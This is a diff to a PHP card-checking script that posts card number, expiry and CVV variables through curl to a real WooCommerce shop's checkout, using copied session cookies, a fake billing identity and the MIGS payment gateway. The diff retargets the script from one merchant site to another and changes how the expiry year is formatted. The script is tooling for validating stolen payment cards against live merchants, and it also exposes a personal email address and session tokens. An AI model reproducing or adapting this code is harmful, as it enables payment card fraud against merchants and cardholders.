@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-If(strlen($ano) > 2)
-{
-  $ano = substr($ano,2,2);
-}
+// If(strlen($ano) > 2)
+// {
+//   $ano = substr($ano,2,2);
+// }
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -238,15 +238,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=e9d63db0c4c3efc0d0017c7dfc0fcd24; woocommerce_items_in_cart=1; wp_woocommerce_session_8878161dc01271bf7d1eedb65f03cb32=980d0c6d5c43e1bc0f0023f57174b337%7C%7C1594210528%7C%7C1594206928%7C%7C7fb65be344d9e316532209d85b0f1d8f; woocommerce_cart_hash=eef632ceb30af7acd218296c92d76ce5',
-'origin: https://romandaniels.com',
-'referer: https://romandaniels.com/checkout/',
+'cookie: wpfront-notification-bar-landingpage=1; wp_woocommerce_session_8e83faf0a70e323ccef66f6553c0c86a=c1487aa6aff94ee52205600e77733658%7C%7C1594203829%7C%7C1594200229%7C%7C8bb4b29f44723f4ac5cd7fd0e66aa134; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp_user_email=pubgkittu%40gmail.com; mailchimp_landing_site=https%3A%2F%2Fginginanddry.net.au%2F%3Fwc-ajax%3Dget_refreshed_fragments; woocommerce_items_in_cart=1; woocommerce_cart_hash=f28c1e0ea58d981659c5977932f912fc',
+'origin: https://ginginanddry.net.au',
+'referer: https://ginginanddry.net.au/checkout-2/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A2-1&payment_method=migs&migs_card_number='.$cc.'&migs_card_expiration_month='.$mes.'&migs_card_expiration_year=20'.$ano.'&migs_card_csc='.$cvv.'&woocommerce-process-checkout-nonce=a435b861e9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A2-1&payment_method=migs&migs_card_number='.$cc.'&migs_card_expiration_month='.$mes.'&migs_card_expiration_year='.$ano.'&migs_card_csc='.$cvv.'&woocommerce-process-checkout-nonce=443b418103&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
